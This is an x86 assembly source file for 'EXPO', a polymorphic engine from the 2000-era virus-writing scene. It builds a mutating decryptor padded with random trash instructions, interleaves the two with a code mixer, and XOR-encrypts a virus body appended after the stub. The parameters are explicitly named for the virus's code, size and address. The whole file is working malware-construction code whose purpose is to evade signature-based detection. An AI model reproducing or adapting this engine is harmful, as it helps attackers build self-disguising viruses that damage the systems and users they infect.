
; ===========================================================================
; EXample POlymorphic (EXPO) engine
; aka example of combining ETG, CODEMIXER and LDE32
; (x) 2000 Z0MBiE, http://z0mbie.cjb.net
; version 1.00, 21-03-2000
; version 1.01, 23-03-2000
; version 1.02, 25-03-2000
; ===========================================================================

EXPO_ERR_SUCCESS        equ     0               ; success
EXPO_ERR_CODEMIXER      equ     1               ; error in codemixer

DECR_SIZE               equ     32              ; max decryptor size [bytes]
TRASH_SIZE              equ     1024            ; size of 'trash' (used ETG)

USETRASH                equ     1               ; def: use trash  undef: NOPs

                        locals  __

expo                    proc    pascal

                        arg     virusva         ; virus VA in file
                        arg     obufsizeptr     ; pointer to res. buffer size
                        arg     obufptr         ; resulting buffer
                        arg     virussize       ; size of virus's code
                        arg     virusptr        ; virus's code, entry at 0

                        local   buf_decr_size
                        local   buf_trash_size
                        local   buf_decr:BYTE:DECR_SIZE
                        local   buf_trash:BYTE:TRASH_SIZE

                        pusha
                        cld

; created poly decryptor (here using alredy existing, 'coz its an example)

                        lea     esi, __decr1
                        mov     ecx, __decr1_size

                        lea     edi, buf_decr
                        mov     buf_decr_size, ecx
                        rep     movsb

                        mov     eax, virussize
                        dec     eax
                        mov     buf_decr.dword ptr (__patch1-__decr1), eax
                        mov     eax, virusva
                        add     eax, DECR_SIZE+TRASH_SIZE
                        mov     buf_decr.dword ptr (__patch2-__decr1), eax

; generate random code (trash)
                        lea     eax, buf_trash
                        lea     ebx, buf_trash_size

IFNDEF USETRASH
                        mov     edi, eax
                        mov     ecx, 64
                        mov     [ebx], ecx
                        mov     al, 90h
                        rep     stosb
ELSE
                        push    offset random           ; offset of rnd()
                        push    eax                     ; output buffer
                        push    TRASH_SIZE              ; max bufsize
                        push    1024                    ; max # of cmds
                        push    ebx                     ; resulting bufsize
                        push    REG_ALL-REG_ECX         ; set of dst regs
                        push    REG_ALL                 ; set of src regs
                        push    ETG_ALL-ETG_JMPS        ; set of avail cmds.
                        call    etg_engine
ENDIF

; initialize LDE32
                        push    offset ldetbl
                        call    disasm_init

; mix buffers (real decrypting code & trash)

                        lea     eax, buf_decr
                        lea     ebx, buf_trash

                        push    offset __my_disasm
                        push    offset random
                        push    eax
                        push    buf_decr_size
                        push    ebx
                        push    buf_trash_size
                        push    obufptr
                        push    -1      ; max size -- unlimited
                        push    obufsizeptr
                        push    4096        ; max # of commands
                        call    codemixer

                        cmp     eax, CM_ERR_SUCCESS
                        mov     eax, EXPO_ERR_CODEMIXER
                        jne     __exit
; encrypt body

                        mov     edi, obufptr
                        mov     edx, obufsizeptr
                        add     edi, [edx]

                        mov     ecx, DECR_SIZE+TRASH_SIZE  ; "alignment"
                        sub     ecx, [edx]
                        jecxz   __skp
                        mov     al, 90h         ; fill alignment with NOPs
                        rep     stosb
__skp:

                        mov     ecx, virussize  ; encrypt virus's body
                        xor     ebx, ebx
                        mov     esi, virusptr
__encr:                 lodsb
                        xor     al, bl
                        inc     ebx
                        stosb
                        loop    __encr

                        sub     edi, obufptr
                        mov     [edx], edi

                        mov     eax, EXPO_ERR_SUCCESS

__exit:                 mov     [esp+7*4], eax

                        popa
                        ret

__my_disasm:            push    dword ptr [esp+4]
                        push    offset ldetbl
                        call    disasm_main
                        retn

__decr1:                mov     ecx, 12345678h  ; <--decryptor structure-->
__patch1                equ     dword ptr $-4
__cycle:                xor     [ecx+12345678h], cl ; virus VA
__patch2                equ     dword ptr $-4
                        dec     ecx
                        jnz     __cycle
__decr1_size            equ     $-__decr1

                        endp    ; expo

; ===========================================================================
